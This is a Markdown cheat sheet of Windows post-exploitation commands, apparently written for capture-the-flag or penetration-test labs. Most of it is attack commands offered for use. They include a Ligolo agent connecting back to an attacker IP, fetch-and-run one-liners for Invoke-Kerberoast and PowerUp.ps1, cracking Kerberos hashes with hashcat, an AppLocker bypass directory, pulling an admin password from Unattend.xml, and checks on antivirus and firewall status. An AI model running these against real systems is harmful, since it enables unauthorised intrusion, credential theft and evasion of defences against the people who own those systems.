### Usefull Powershell scripts
https://github.com/samratashok/nishang

### Show Priviledges(same as sudo -l)
```
whoami /priv
```

### Windows Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits

### Check Arp table
```
arp -a
```

### Run a exe in background 
(similar to ./binary & in Linux) pretty usefull so that if shell dies you program won't!
```
START /MIN program 
OR in Powershell
Start-Job -name Ligolo { C:\temp\agent.exe -connect 10.10.14.3:443 -ignore-cert }
```

### Check Windows Defender status
```
Get-Service WinDefend
Get-MpComputerStatus | select RealTimeProtectionEnabled
```

###  Check installed AV
```
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

### Check Firewall status
```
Get-NetFirewallProfile | Format-Table Name, Enabled
```

### Check Firewall rules
```
Get-NetFirewallRule | select DisplayName, Enabled, Description
```

### Find process ID
```
Get-Process -Name <process_name>
or
netstat -abn
```

### Find open port by process
```
Get-NetTCPConnection -OwningProcess <PID>
or
netstat -noa |findstr "LISTENING" |findstr "3212"
```

### Enumerate DNS records
```
nslookup.exe
server <IP>
ls -d <domain>
```

### List Shares
```
net share
```

### Powershell command history
```
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Bypass Applocker
```
Placing our executable in the following directory: C:\Windows\System32\spool\drivers\color
```
(This is whitelisted by default. =

### List all accounts in SPN
```
setspn -T medin -Q */*
```

### Get Kerberos ticket
```
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```
(from the Kerberos ticket)
```
hashcat -m 13100 -​a 0 hash.txt wordlist --force
```

### Get Admin Password from Unattended.xml
```
wget http://10.14.24.190:9000/PowerUp.ps1 -OutFile PowerUP.ps1
Import-Module ./PowerUP.ps1
Invoke-AllChecks
```
(Get admin password from unattended.xml script)
```
type C:\Windows\Panther\Unattend\Unattended.xml
```
base64 decode password

### List all hidded files/folder(like ls -al)
```
ls -force
or 
Get-ChildItem -Force
```

### IIS webconfig
```
C:\\inetpub\\wwwroot\\web.config
```

### Pass Spray O365
https://github.com/0xZDH/o365spray

### Pingsweep from Powershell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
CMD
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
BASH
```
for i in {1..254} ;do (ping 192.168.1.$i -c 1 -w 5  >/dev/null && echo "192.168.1.$i" &) ;done
```